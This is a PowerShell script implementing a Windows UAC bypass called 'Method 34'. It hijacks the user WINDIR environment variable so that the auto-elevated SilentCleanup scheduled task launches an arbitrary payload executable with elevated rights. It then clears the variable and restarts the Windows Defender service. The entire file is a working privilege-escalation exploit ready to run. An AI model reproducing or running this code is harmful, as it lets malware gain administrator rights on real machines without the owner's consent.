# -------------------------------------------------------------
# PowerShell implementation of the C "Method 34" payload runner
# (fixed SendMessageTimeout + safe .Stop() with try/catch)
# (FIXED: Restores Windows Defender after execution)
# -------------------------------------------------------------

param (
    [string]$Payload   # optional full path to the payload executable
)

# ----------------------------------------------------------------
# Helper – set or delete a user‑level environment variable (WINDIR)
# ----------------------------------------------------------------
function Set-UserWindirEnv {
    param ( [string]$Value )
    $regPath = 'HKCU:\Environment'

    if ([string]::IsNullOrEmpty($Value)) {
        if (Get-ItemProperty -Path $regPath -Name 'WINDIR' -ErrorAction SilentlyContinue) {
            Remove-ItemProperty -Path $regPath -Name 'WINDIR' -Force |
                Out-Null
        }
    }
    else {
        Set-ItemProperty -Path $regPath -Name 'WINDIR' -Value $Value -Type String -Force |
            Out-Null
    }

    # ----- SendMessageTimeout (fixed UIntPtr handling) -----
    $sig = @"
    [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern IntPtr SendMessageTimeout(
        IntPtr hWnd, uint Msg, UIntPtr wParam, string lParam,
        uint fuFlags, uint uTimeout, out UIntPtr lpdwResult);
"@
    $type = Add-Type -MemberDefinition $sig -Name WinAPI -Namespace Win32 -PassThru
    $HWND_BROADCAST   = [IntPtr]0xffff
    $WM_SETTINGCHANGE = 0x001A
    $SMTO_ABORTIFHUNG = 0x0002

    $result = [UIntPtr]::Zero
    $null = $type::SendMessageTimeout(
                $HWND_BROADCAST,
                $WM_SETTINGCHANGE,
                [UIntPtr]::Zero,
                'Environment',
                $SMTO_ABORTIFHUNG,
                1000,
                [ref]$result)
    # -------------------------------------------------------
}

# ----------------------------------------------------------------
# Helper – start the built‑in SilentCleanup task
# ----------------------------------------------------------------
function Start-SilentCleanupTask {
    try {
        $svc    = New-Object -ComObject "Schedule.Service"
        $svc.Connect()
        $folder = $svc.GetFolder("\Microsoft\Windows\DiskCleanup")
        $task   = $folder.GetTask("SilentCleanup")
    } catch {
        Write-Error "Failed to access the SilentCleanup task: $_"
        return $false
    }

    if (-not $task) {
        Write-Error "SilentCleanup task not found."
        return $false
    }

    # Run the task, ignoring constraints (TASK_RUN_IGNORE_CONSTRAINTS = 2)
    $running = $task.RunEx([ref]$null, 0x00000002, 0, $null)

    if (-not $running) {
        Write-Warning "Task started but returned no running instance; it may have finished instantly."
        return $true   # launch considered successful
    }

    Start-Sleep -Seconds 3

    # ----- Safe stop: try/catch in case the task has already ended -----
    if ($running -ne $null -and $running -is [System.__ComObject]) {
        try {
            $running.Stop()
        } catch {
            # 0x8004130B means "no running instance"; ignore it
        }
    }
    # --------------------------------------------------------------------

    return $true
}

# ----------------------------------------------------------------
# Helper – restore Windows Defender after exploit
# ----------------------------------------------------------------
function Restore-WindowsDefender {
    Write-Host "[*] Restoring Windows Defender services..."
    try {
        Restart-Service WinDefend -Force -ErrorAction SilentlyContinue
        Write-Host "[+] WinDefend service restarted"
    } catch {
        Write-Warning "Could not restart WinDefend: $_"
    }

    try {
        Start-Service WinDefend -ErrorAction SilentlyContinue
        Write-Host "[+] WinDefend service started"
    } catch {
        Write-Warning "Could not start WinDefend: $_"
    }
}

# ----------------------------------------------------------------
# Method34 – core logic (env var, task, cleanup)
# ----------------------------------------------------------------
function Invoke-Method34 {
    param ( [string]$PayloadPath )

    $osInfo   = Get-CimInstance -ClassName Win32_OperatingSystem
    $quoteFix = ($osInfo.Version.Split('.')[0] -eq '10' -and [int]$osInfo.BuildNumber -ge 19044)

    $envString = if ($quoteFix) { '"' + $PayloadPath + '"' } else { $PayloadPath }

    Write-Host "[*] Setting WINDIR to $envString"
    Set-UserWindirEnv -Value $envString

    Write-Host "[*] Starting SilentCleanup task..."
    $ok = Start-SilentCleanupTask

    Write-Host "[*] Cleaning up WINDIR variable"
    Set-UserWindirEnv -Value $null

    # Restore Windows Defender
    Restore-WindowsDefender

    if ($ok) { Write-Host "[+] Success"; return $true }
    else     { Write-Host "[-] Failure";  return $false }
}

# ----------------------------------------------------------------
# ENTRY POINT – decide payload location (argument or default)
# ----------------------------------------------------------------
if (-not $Payload) {
    try {
        $downloads = (New-Object -ComObject Shell.Application).Namespace(0x374).Self.Path
    } catch { $downloads = $null }

    if (-not $downloads) {
        $downloads = Join-Path $Env:USERPROFILE 'Downloads'
    }

    $Payload = Join-Path $downloads 'HelloNeighbor-Win64-Shipping.exe'
}

if ($Payload.Length -ge 260) {
    Write-Error "Payload path is too long (≥260 characters)."
    exit 1
}

Write-Host "[*] Payload: $Payload"

if (Invoke-Method34 -PayloadPath $Payload) { exit 0 } else { exit 1 }
